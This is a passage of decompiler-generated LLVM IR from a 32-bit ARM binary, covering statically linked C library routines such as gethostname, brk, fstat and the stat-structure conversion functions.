  store i32 ptrtoint (i32* @global_var_daac.2087 to i32), i32* %r3.global-to-local, align 4
  %v2_30700 = add i32 %v0_30700, 55976
  %v3_30700 = inttoptr i32 %v2_30700 to i32*
  %v4_30700 = load i32, i32* %v3_30700, align 4
  store i32 %v4_30700, i32* %r1.global-to-local, align 4
  %v2_30704 = add i32 %v0_30700, ptrtoint (i32* @global_var_daac.2087 to i32)
  %v3_30704 = inttoptr i32 %v2_30704 to i32*
  %v4_30704 = load i32, i32* %v3_30704, align 4
  store i32 %v4_30704, i32* %ip.global-to-local, align 4
  %v1_30708 = add i32 %v4_30700, 1
  store i32 %v1_30708, i32* %r0.global-to-local, align 4
  %v3_30710 = mul i32 %v4_30700, 16
  store i32 %v3_30710, i32* %r1.global-to-local, align 4
  store i32 -82924, i32* %r2.global-to-local, align 4
  %v3_30718 = add i32 %v4_30704, %v3_30710
  %v4_30718 = inttoptr i32 %v3_30718 to i32*
  store i32 1, i32* %v4_30718, align 4
  store i32 55680, i32* %r3.global-to-local, align 4
  %v0_30720 = load i32, i32* @r5, align 4
  %v1_30720 = load i32, i32* %r2.global-to-local, align 4
  %v2_30720 = add i32 %v1_30720, %v0_30720
  store i32 %v2_30720, i32* %r2.global-to-local, align 4
  %v3_30724 = add i32 %v0_30720, 55680
  %v4_30724 = inttoptr i32 %v3_30724 to i32*
  store i32 %v2_30720, i32* %v4_30724, align 4
  %v0_30728 = load i32, i32* %r0.global-to-local, align 4
  %v1_30728 = load i32, i32* @r5, align 4
  %v2_30728 = load i32, i32* %lr.global-to-local, align 4
  %v3_30728 = add i32 %v2_30728, %v1_30728
  %v4_30728 = inttoptr i32 %v3_30728 to i32*
  store i32 %v0_30728, i32* %v4_30728, align 4
  %v0_3072c = load i32, i32* %r1.global-to-local, align 4
  %v1_3072c = load i32, i32* %ip.global-to-local, align 4
  %v2_3072c = add i32 %v1_3072c, %v0_3072c
  store i32 %v2_3072c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30730

dec_label_pc_30730:                               ; preds = %dec_label_pc_306d8, %dec_label_pc_306f8
  store i32 %v2_3066c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_3073c = load i32, i32* @r5, align 4
  %v2_3073c = add i32 %v0_3073c, 76
  %v3_3073c = inttoptr i32 %v2_3073c to i32*
  %v4_3073c = load i32, i32* %v3_3073c, align 4
  store i32 %v4_3073c, i32* %ip.global-to-local, align 4
  store i32 198472, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_3073c)
  %v0_30748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_30748, i32* %r0.global-to-local, align 4
  %v2_30750 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_30750, i32* @r4, align 4
  store i32 %v6_30654, i32* @r5, align 4
  store i32 %v15_30654, i32* %lr.global-to-local, align 4
  ret i32 %v0_30748

; uselistorder directives
  uselistorder i32 %v0_30720, { 1, 0 }
  uselistorder i32 %v3_30710, { 1, 0 }
  uselistorder i32 %v0_30700, { 1, 0 }
  uselistorder i32 %v0_306a8, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 320, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_daac.2087 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 55976, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_30730, { 1, 0 }
  uselistorder label %dec_label_pc_306f8, { 1, 0 }
}

define i32 @function_3075c(i64* %arg1) local_unnamed_addr {
dec_label_pc_3075c:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_3075c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_3075c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_3075c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_3075c, %bb
  %v4_30768 = phi i32 [ %tmp, %dec_label_pc_3075c ], [ 0, %bb ]
  ret i32 %v4_30768

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v4_30790 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 232) to i32*), align 4
  %v4_30798 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 148) to i32*), align 4
  store i32 %v4_30798, i32* %r1.global-to-local, align 4
  %v1_3079c = add i32 %arg1, 44
  %v2_3079c = inttoptr i32 %v1_3079c to i32*
  %v3_3079c = load i32, i32* %v2_3079c, align 4
  %v1_307a0 = add i32 %arg1, 28
  %v2_307a0 = inttoptr i32 %v1_307a0 to i32*
  %v3_307a0 = load i32, i32* %v2_307a0, align 4
  store i32 %v3_307a0, i32* %r2.global-to-local, align 4
  %v2_307a4 = inttoptr i32 %v4_30790 to i32*
  store i32 %v3_3079c, i32* %v2_307a4, align 4
  %v0_307a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_307a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_307a8 = inttoptr i32 %v1_307a8 to i32*
  store i32 %v0_307a8, i32* %v2_307a8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_307b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_307b4:
  %v0_307b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_307b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_307b4
  %v2_307b4 = load i32, i32* @r8, align 4
  %v3_307b4 = udiv i32 %v2_307b4, 2
  %v4_307b4 = shl i32 %v2_307b4, 31
  %v5_307b4 = or i32 %v3_307b4, %v4_307b4
  %v8_307b4 = and i32 %v5_307b4, %arg1
  %v1_307b8 = load i32, i32* @r4, align 4
  %v3_307b8 = mul i32 %v8_307b4, %v1_307b8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_307b4, %bb
  %v4_307b8 = phi i32 [ %arg1, %dec_label_pc_307b4 ], [ %v3_307b8, %bb ]
  ret i32 %v4_307b8

; uselistorder directives
  uselistorder i32 %v2_307b4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_307f8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55988) to i32*), align 4
  ret i32 0
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_30810 = load i32, i32* @r1, align 4
  store i32 %v0_30810, i32* @r3, align 4
  %v0_30820 = load i32, i32* @r0, align 4
  store i32 %v0_30820, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_30820, -4095
  br i1 %tmp, label %dec_label_pc_30840, label %dec_label_pc_3082c

dec_label_pc_3082c:                               ; preds = %entry
  %v0_3082c = call i32 @__GI___errno_location()
  %v0_30830 = load i32, i32* %r7.global-to-local, align 4
  %v1_30830 = sub i32 0, %v0_30830
  store i32 %v1_30830, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_30838 = inttoptr i32 %v0_3082c to i32*
  store i32 %v1_30830, i32* %v2_30838, align 4
  br label %dec_label_pc_30850

dec_label_pc_30840:                               ; preds = %entry
  %v2_30840 = icmp eq i32 %v0_30820, 0
  br i1 %v2_30840, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_30840
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_30840, %bb
  call void @__pseudo_cond_branch(i1 %v2_30840, i32 ptrtoint (i32* @global_var_30a50.2104 to i32))
  br label %dec_label_pc_30850

dec_label_pc_30850:                               ; preds = %dec_label_pc_3082c, %.thread
  %v0_30850 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_30850

; uselistorder directives
  uselistorder i32 %v0_30820, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_30850, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_3086c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_3087c = call i32 @uname(i32 %v2_3086c)
  %v7_30880 = icmp eq i32 %v1_3087c, -1
  br i1 %v7_30880, label %bb, label %dec_label_pc_3088c

bb:                                               ; preds = %entry
  store i32 %v1_3087c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_308c8

dec_label_pc_3088c:                               ; preds = %entry
  %v2_3088c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_30894 = call i32 @strlen(i8* %tmp10)
  %v1_30898 = add i32 %v3_30894, 1
  %v1_3089c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_30898, %v1_3089c
  br i1 %tmp, label %dec_label_pc_308a4, label %dec_label_pc_308b8

dec_label_pc_308a4:                               ; preds = %dec_label_pc_3088c
  %v0_308a4 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_308b0 = inttoptr i32 %v0_308a4 to i32*
  store i32 22, i32* %v2_308b0, align 4
  %v0_308c8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_308c8

dec_label_pc_308b8:                               ; preds = %dec_label_pc_3088c
  %v0_308b8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_3088c, i32* @r1, align 4
  %v2_308c0 = inttoptr i32 %v0_308b8 to i8*
  %v3_308c0 = call i32 @strcpy(i8* %v2_308c0, i32 %v2_3088c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_308c8

dec_label_pc_308c8:                               ; preds = %bb, %dec_label_pc_308a4, %dec_label_pc_308b8
  %v0_308c8 = phi i32 [ %v1_3087c, %bb ], [ %v0_308c8.pre, %dec_label_pc_308a4 ], [ 0, %dec_label_pc_308b8 ]
  ret i32 %v0_308c8

; uselistorder directives
  uselistorder i32 %v2_3088c, { 1, 0 }
  uselistorder i32 %v1_3087c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_308c8, { 2, 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_308d8 = load i32, i32* @r4, align 4
  store i32 %v3_308d8, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 104, i32* @r2, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_308f0 = call i32 @__GI_memset()
  %v2_308f4 = load i32, i32* %arg1, align 4
  store i32 %v2_308f4, i32* %r3.global-to-local, align 4
  %v3_308f4 = add i32 %tmp, 4
  %v4_308f4 = inttoptr i32 %v3_308f4 to i32*
  %v5_308f4 = load i32, i32* %v4_308f4, align 4
  store i32 %v5_308f4, i32* %r4.global-to-local, align 4
  %v0_308f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_308f8 = inttoptr i32 %v0_308f8 to i32*
  store i32 %v2_308f4, i32* %v1_308f8, align 4
  %v3_308f8 = add i32 %v0_308f8, 4
  %v4_308f8 = inttoptr i32 %v3_308f8 to i32*
  %v5_308f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_308f8, i32* %v4_308f8, align 4
  %v0_308fc = load i32, i32* %r6.global-to-local, align 4
  %v1_308fc = add i32 %v0_308fc, 12
  %v2_308fc = inttoptr i32 %v1_308fc to i32*
  %v3_308fc = load i32, i32* %v2_308fc, align 4
  %v1_30900 = load i32, i32* %r5.global-to-local, align 4
  %v2_30900 = add i32 %v1_30900, 12
  %v3_30900 = inttoptr i32 %v2_30900 to i32*
  store i32 %v3_308fc, i32* %v3_30900, align 4
  %v0_30904 = load i32, i32* %r6.global-to-local, align 4
  %v1_30904 = add i32 %v0_30904, 96
  store i32 %v1_30904, i32* %r3.global-to-local, align 4
  %v1_30908 = inttoptr i32 %v1_30904 to i32*
  %v2_30908 = load i32, i32* %v1_30908, align 4
  store i32 %v2_30908, i32* %r3.global-to-local, align 4
  %v3_30908 = add i32 %v0_30904, 100
  %v4_30908 = inttoptr i32 %v3_30908 to i32*
  %v5_30908 = load i32, i32* %v4_30908, align 4
  store i32 %v5_30908, i32* %r4.global-to-local, align 4
  %v1_3090c = add i32 %v0_30904, 56
  %v2_3090c = inttoptr i32 %v1_3090c to i32*
  %v3_3090c = load i32, i32* %v2_3090c, align 4
  store i32 %v3_3090c, i32* %r2.global-to-local, align 4
  %v1_30910 = load i32, i32* %r5.global-to-local, align 4
  %v2_30910 = add i32 %v1_30910, 96
  %v3_30910 = inttoptr i32 %v2_30910 to i32*
  store i32 %v2_30908, i32* %v3_30910, align 4
  %v0_30914 = load i32, i32* %r4.global-to-local, align 4
  %v1_30914 = load i32, i32* %r5.global-to-local, align 4
  %v2_30914 = add i32 %v1_30914, 100
  %v3_30914 = inttoptr i32 %v2_30914 to i32*
  store i32 %v0_30914, i32* %v3_30914, align 4
  %v0_30918 = load i32, i32* %r6.global-to-local, align 4
  %v1_30918 = add i32 %v0_30918, 24
  store i32 %v1_30918, i32* %ip.global-to-local, align 4
  %v1_3091c = inttoptr i32 %v1_30918 to i32*
  %v2_3091c = load i32, i32* %v1_3091c, align 4
  store i32 %v2_3091c, i32* %ip.global-to-local, align 4
  %v3_3091c = add i32 %v0_30918, 28
  %v4_3091c = inttoptr i32 %v3_3091c to i32*
  %v5_3091c = load i32, i32* %v4_3091c, align 4
  store i32 %v5_3091c, i32* %lr.global-to-local, align 4
  %v0_30920 = load i32, i32* %r2.global-to-local, align 4
  %v1_30920 = load i32, i32* %r5.global-to-local, align 4
  %v2_30920 = add i32 %v1_30920, 56
  %v3_30920 = inttoptr i32 %v2_30920 to i32*
  store i32 %v0_30920, i32* %v3_30920, align 4
  %v0_30924 = load i32, i32* %r6.global-to-local, align 4
  %v1_30924 = add i32 %v0_30924, 72
  store i32 %v1_30924, i32* %r3.global-to-local, align 4
  %v1_30928 = add i32 %v0_30924, 32
  store i32 %v1_30928, i32* %r7.global-to-local, align 4
  %v1_3092c = inttoptr i32 %v1_30928 to i32*
  %v2_3092c = load i32, i32* %v1_3092c, align 4
  store i32 %v2_3092c, i32* %r7.global-to-local, align 4
  %v3_3092c = add i32 %v0_30924, 36
  %v4_3092c = inttoptr i32 %v3_3092c to i32*
  %v5_3092c = load i32, i32* %v4_3092c, align 4
  store i32 %v5_3092c, i32* %r8.global-to-local, align 4
  %v1_30930 = inttoptr i32 %v1_30924 to i32*
  %v2_30930 = load i32, i32* %v1_30930, align 4
  %v3_30930 = add i32 %v0_30924, 76
  %v4_30930 = inttoptr i32 %v3_30930 to i32*
  %v5_30930 = load i32, i32* %v4_30930, align 4
  store i32 %v5_30930, i32* %r1.global-to-local, align 4
  %v0_30934 = load i32, i32* %r5.global-to-local, align 4
  %v1_30934 = add i32 %v0_30934, 72
  %v1_30938 = inttoptr i32 %v1_30934 to i32*
  store i32 %v2_30930, i32* %v1_30938, align 4
  %v3_30938 = add i32 %v0_30934, 76
  %v4_30938 = inttoptr i32 %v3_30938 to i32*
  %v5_30938 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30938, i32* %v4_30938, align 4
  %v0_3093c = load i32, i32* %r7.global-to-local, align 4
  %v1_3093c = load i32, i32* %r5.global-to-local, align 4
  %v2_3093c = add i32 %v1_3093c, 32
  %v3_3093c = inttoptr i32 %v2_3093c to i32*
  store i32 %v0_3093c, i32* %v3_3093c, align 4
  %v0_30940 = load i32, i32* %r8.global-to-local, align 4
  %v1_30940 = load i32, i32* %r5.global-to-local, align 4
  %v2_30940 = add i32 %v1_30940, 36
  %v3_30940 = inttoptr i32 %v2_30940 to i32*
  store i32 %v0_30940, i32* %v3_30940, align 4
  %v0_30944 = load i32, i32* %r6.global-to-local, align 4
  %v1_30944 = add i32 %v0_30944, 80
  store i32 %v1_30944, i32* %r3.global-to-local, align 4
  %v1_30948 = add i32 %v0_30944, 48
  store i32 %v1_30948, i32* %r7.global-to-local, align 4
  %v1_3094c = inttoptr i32 %v1_30948 to i32*
  %v2_3094c = load i32, i32* %v1_3094c, align 4
  store i32 %v2_3094c, i32* %r7.global-to-local, align 4
  %v3_3094c = add i32 %v0_30944, 52
  %v4_3094c = inttoptr i32 %v3_3094c to i32*
  %v5_3094c = load i32, i32* %v4_3094c, align 4
  store i32 %v5_3094c, i32* %r8.global-to-local, align 4
  %v1_30950 = inttoptr i32 %v1_30944 to i32*
  %v2_30950 = load i32, i32* %v1_30950, align 4
  %v3_30950 = add i32 %v0_30944, 84
  %v4_30950 = inttoptr i32 %v3_30950 to i32*
  %v5_30950 = load i32, i32* %v4_30950, align 4
  store i32 %v5_30950, i32* %r1.global-to-local, align 4
  %v1_30954 = add i32 %v0_30944, 16
  %v2_30954 = inttoptr i32 %v1_30954 to i32*
  %v3_30954 = load i32, i32* %v2_30954, align 4
  store i32 %v3_30954, i32* %r2.global-to-local, align 4
  %v0_30958 = load i32, i32* %r5.global-to-local, align 4
  %v1_30958 = add i32 %v0_30958, 80
  %v1_3095c = inttoptr i32 %v1_30958 to i32*
  store i32 %v2_30950, i32* %v1_3095c, align 4
  %v3_3095c = add i32 %v0_30958, 84
  %v4_3095c = inttoptr i32 %v3_3095c to i32*
  %v5_3095c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_3095c, i32* %v4_3095c, align 4
  %v0_30960 = load i32, i32* %r7.global-to-local, align 4
  %v1_30960 = load i32, i32* %r5.global-to-local, align 4
  %v2_30960 = add i32 %v1_30960, 48
  %v3_30960 = inttoptr i32 %v2_30960 to i32*
  store i32 %v0_30960, i32* %v3_30960, align 4
  %v0_30964 = load i32, i32* %r8.global-to-local, align 4
  %v1_30964 = load i32, i32* %r5.global-to-local, align 4
  %v2_30964 = add i32 %v1_30964, 52
  %v3_30964 = inttoptr i32 %v2_30964 to i32*
  store i32 %v0_30964, i32* %v3_30964, align 4
  %v0_30968 = load i32, i32* %r2.global-to-local, align 4
  %v1_30968 = load i32, i32* %r5.global-to-local, align 4
  %v2_30968 = add i32 %v1_30968, 16
  %v3_30968 = inttoptr i32 %v2_30968 to i32*
  store i32 %v0_30968, i32* %v3_30968, align 4
  %v0_3096c = load i32, i32* %r6.global-to-local, align 4
  %v1_3096c = add i32 %v0_3096c, 88
  store i32 %v1_3096c, i32* %r3.global-to-local, align 4
  %v1_30970 = add i32 %v0_3096c, 20
  %v2_30970 = inttoptr i32 %v1_30970 to i32*
  %v3_30970 = load i32, i32* %v2_30970, align 4
  store i32 %v3_30970, i32* %r2.global-to-local, align 4
  %v1_30974 = inttoptr i32 %v1_3096c to i32*
  %v2_30974 = load i32, i32* %v1_30974, align 4
  %v3_30974 = add i32 %v0_3096c, 92
  %v4_30974 = inttoptr i32 %v3_30974 to i32*
  %v5_30974 = load i32, i32* %v4_30974, align 4
  store i32 %v5_30974, i32* %r1.global-to-local, align 4
  %v1_30978 = add i32 %v0_3096c, 64
  store i32 %v1_30978, i32* %r6.global-to-local, align 4
  %v1_3097c = inttoptr i32 %v1_30978 to i32*
  %v2_3097c = load i32, i32* %v1_3097c, align 4
  store i32 %v2_3097c, i32* %r6.global-to-local, align 4
  %v3_3097c = add i32 %v0_3096c, 68
  %v4_3097c = inttoptr i32 %v3_3097c to i32*
  %v5_3097c = load i32, i32* %v4_3097c, align 4
  store i32 %v5_3097c, i32* %r7.global-to-local, align 4
  %v0_30980 = load i32, i32* %r5.global-to-local, align 4
  %v1_30980 = add i32 %v0_30980, 88
  store i32 %v1_30980, i32* %r3.global-to-local, align 4
  %v2_30984 = add i32 %v0_30980, 20
  %v3_30984 = inttoptr i32 %v2_30984 to i32*
  store i32 %v3_30970, i32* %v3_30984, align 4
  %v0_30988 = load i32, i32* %ip.global-to-local, align 4
  %v1_30988 = load i32, i32* %r5.global-to-local, align 4
  %v2_30988 = add i32 %v1_30988, 24
  %v3_30988 = inttoptr i32 %v2_30988 to i32*
  store i32 %v0_30988, i32* %v3_30988, align 4
  %v0_3098c = load i32, i32* %lr.global-to-local, align 4
  %v1_3098c = load i32, i32* %r5.global-to-local, align 4
  %v2_3098c = add i32 %v1_3098c, 28
  %v3_3098c = inttoptr i32 %v2_3098c to i32*
  store i32 %v0_3098c, i32* %v3_3098c, align 4
  %v0_30990 = load i32, i32* %r6.global-to-local, align 4
  %v1_30990 = load i32, i32* %r5.global-to-local, align 4
  %v2_30990 = add i32 %v1_30990, 64
  %v3_30990 = inttoptr i32 %v2_30990 to i32*
  store i32 %v0_30990, i32* %v3_30990, align 4
  %v0_30994 = load i32, i32* %r7.global-to-local, align 4
  %v1_30994 = load i32, i32* %r5.global-to-local, align 4
  %v2_30994 = add i32 %v1_30994, 68
  %v3_30994 = inttoptr i32 %v2_30994 to i32*
  store i32 %v0_30994, i32* %v3_30994, align 4
  %v0_30998 = load i32, i32* %r3.global-to-local, align 4
  %v1_30998 = inttoptr i32 %v0_30998 to i32*
  store i32 %v2_30974, i32* %v1_30998, align 4
  %v3_30998 = add i32 %v0_30998, 4
  %v4_30998 = inttoptr i32 %v3_30998 to i32*
  %v5_30998 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30998, i32* %v4_30998, align 4
  %v2_3099c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_3099c, i32* %r4.global-to-local, align 4
  ret i32 %v2_30974

; uselistorder directives
  uselistorder i32 %v0_3096c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_30944, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 104, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_309a4 = load i32, i32* @r4, align 4
  store i32 %v3_309a4, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_309bc = call i32 @__GI_memset()
  %v2_309c0 = load i32, i32* %arg1, align 4
  %v3_309c0 = add i32 %tmp, 4
  %v4_309c0 = inttoptr i32 %v3_309c0 to i32*
  %v5_309c0 = load i32, i32* %v4_309c0, align 4
  store i32 %v5_309c0, i32* %r4.global-to-local, align 4
  %v0_309c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_309c4 = inttoptr i32 %v0_309c4 to i32*
  store i32 %v2_309c0, i32* %v1_309c4, align 4
  %v3_309c4 = add i32 %v0_309c4, 4
  %v4_309c4 = inttoptr i32 %v3_309c4 to i32*
  %v5_309c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_309c4, i32* %v4_309c4, align 4
  %v0_309c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_309c8 = add i32 %v0_309c8, 32
  %v1_309cc = inttoptr i32 %v1_309c8 to i32*
  %v2_309cc = load i32, i32* %v1_309cc, align 4
  %v3_309cc = add i32 %v0_309c8, 36
  %v4_309cc = inttoptr i32 %v3_309cc to i32*
  %v5_309cc = load i32, i32* %v4_309cc, align 4
  store i32 %v5_309cc, i32* %r4.global-to-local, align 4
  %v1_309d0 = add i32 %v0_309c8, 96
  %v2_309d0 = inttoptr i32 %v1_309d0 to i32*
  %v3_309d0 = load i32, i32* %v2_309d0, align 4
  store i32 %v3_309d0, i32* %r2.global-to-local, align 4
  %v1_309d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_309d4 = add i32 %v1_309d4, 32
  %v3_309d4 = inttoptr i32 %v2_309d4 to i32*
  store i32 %v2_309cc, i32* %v3_309d4, align 4
  %v0_309d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_309d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_309d8 = add i32 %v1_309d8, 36
  %v3_309d8 = inttoptr i32 %v2_309d8 to i32*
  store i32 %v0_309d8, i32* %v3_309d8, align 4
  %v0_309dc = load i32, i32* %r2.global-to-local, align 4
  %v1_309dc = load i32, i32* %r6.global-to-local, align 4
  %v2_309dc = add i32 %v1_309dc, 12
  %v3_309dc = inttoptr i32 %v2_309dc to i32*
  store i32 %v0_309dc, i32* %v3_309dc, align 4
  %v0_309e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_309e0 = add i32 %v0_309e0, 48
  %v2_309e0 = inttoptr i32 %v1_309e0 to i32*
  %v3_309e0 = load i32, i32* %v2_309e0, align 4
  %v1_309e4 = add i32 %v0_309e0, 24
  store i32 %v1_309e4, i32* %ip.global-to-local, align 4
  %v1_309e8 = inttoptr i32 %v1_309e4 to i32*
  %v2_309e8 = load i32, i32* %v1_309e8, align 4
  store i32 %v2_309e8, i32* %ip.global-to-local, align 4
  %v3_309e8 = add i32 %v0_309e0, 28
  %v4_309e8 = inttoptr i32 %v3_309e8 to i32*
  %v5_309e8 = load i32, i32* %v4_309e8, align 4
  store i32 %v5_309e8, i32* %lr.global-to-local, align 4
  %v1_309ec = load i32, i32* %r6.global-to-local, align 4
  %v2_309ec = add i32 %v1_309ec, 44
  %v3_309ec = inttoptr i32 %v2_309ec to i32*
  store i32 %v3_309e0, i32* %v3_309ec, align 4
  %v0_309f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_309f0 = add i32 %v0_309f0, 64
  %v2_309f0 = inttoptr i32 %v1_309f0 to i32*
  %v3_309f0 = load i32, i32* %v2_309f0, align 4
  %v1_309f4 = add i32 %v0_309f0, 56
  %v2_309f4 = inttoptr i32 %v1_309f4 to i32*
  %v3_309f4 = load i32, i32* %v2_309f4, align 4
  store i32 %v3_309f4, i32* %r2.global-to-local, align 4
  %v1_309f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_309f8 = add i32 %v1_309f8, 52
  %v3_309f8 = inttoptr i32 %v2_309f8 to i32*
  store i32 %v3_309f0, i32* %v3_309f8, align 4
  %v0_309fc = load i32, i32* %r2.global-to-local, align 4
  %v1_309fc = load i32, i32* %r6.global-to-local, align 4
  %v2_309fc = add i32 %v1_309fc, 48
  %v3_309fc = inttoptr i32 %v2_309fc to i32*
  store i32 %v0_309fc, i32* %v3_309fc, align 4
  %v0_30a00 = load i32, i32* %r5.global-to-local, align 4
  %v1_30a00 = add i32 %v0_30a00, 72
  %v1_30a04 = inttoptr i32 %v1_30a00 to i32*
  %v2_30a04 = load i32, i32* %v1_30a04, align 4
  %v3_30a04 = add i32 %v0_30a00, 76
  %v4_30a04 = inttoptr i32 %v3_30a04 to i32*
  %v5_30a04 = load i32, i32* %v4_30a04, align 4
  store i32 %v5_30a04, i32* %r1.global-to-local, align 4
  %v0_30a08 = load i32, i32* %r6.global-to-local, align 4
  %v1_30a08 = add i32 %v0_30a08, 56
  %v1_30a0c = inttoptr i32 %v1_30a08 to i32*
  store i32 %v2_30a04, i32* %v1_30a0c, align 4
  %v3_30a0c = add i32 %v0_30a08, 60
  %v4_30a0c = inttoptr i32 %v3_30a0c to i32*
  %v5_30a0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30a0c, i32* %v4_30a0c, align 4
  %v0_30a10 = load i32, i32* %r5.global-to-local, align 4
  %v1_30a10 = add i32 %v0_30a10, 80
  %v1_30a14 = inttoptr i32 %v1_30a10 to i32*
